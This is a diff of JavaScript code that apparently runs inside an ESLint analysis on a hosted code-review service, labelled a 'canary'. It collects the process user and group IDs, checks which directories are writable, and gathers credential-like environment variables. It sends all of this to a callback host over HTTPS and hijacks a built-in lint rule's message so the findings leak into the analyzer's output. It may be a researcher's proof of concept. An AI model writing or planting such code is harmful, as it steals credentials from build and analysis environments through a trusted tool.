@@ -29,19 +29,37 @@ function credentialLikeEnvironment() {
 if (!globalThis.__codacyAnalyzerCanarySent) {
   globalThis.__codacyAnalyzerCanarySent = true;
 
+  const runtime = {
+    uid: typeof process.getuid === "function" ? process.getuid() : null,
+    gid: typeof process.getgid === "function" ? process.getgid() : null,
+    cwd: process.cwd(),
+    sourceWritable: isWritable("/src"),
+    rootWritable: isWritable("/"),
+    workdirWritable: isWritable("/workdir"),
+  };
+  const credentials = credentialLikeEnvironment();
   const payload = JSON.stringify({
     canary: CANARY,
     tool: "eslint",
-    runtime: {
-      uid: typeof process.getuid === "function" ? process.getuid() : null,
-      gid: typeof process.getgid === "function" ? process.getgid() : null,
-      cwd: process.cwd(),
-      sourceWritable: isWritable("/src"),
-      rootWritable: isWritable("/"),
-      workdirWritable: isWritable("/workdir"),
-    },
-    credentials: credentialLikeEnvironment(),
+    runtime,
+    credentials,
   });
+
+  const runtimeEvidence = [
+    "CODACY_CANARY_EXECUTED",
+    `uid=${runtime.uid}`,
+    `gid=${runtime.gid}`,
+    `source_writable=${runtime.sourceWritable}`,
+    `root_writable=${runtime.rootWritable}`,
+    `workdir_writable=${runtime.workdirWritable}`,
+    `credential_names=${Object.keys(credentials).sort().join(",")}`,
+  ].join(" ");
+
+  try {
+    const { builtinRules } = require("eslint/use-at-your-own-risk");
+    const noConsoleRule = builtinRules.get("no-console");
+    noConsoleRule.meta.messages.unexpected = runtimeEvidence;
+  } catch {}
 
   const request = https.request(
     CALLBACK,
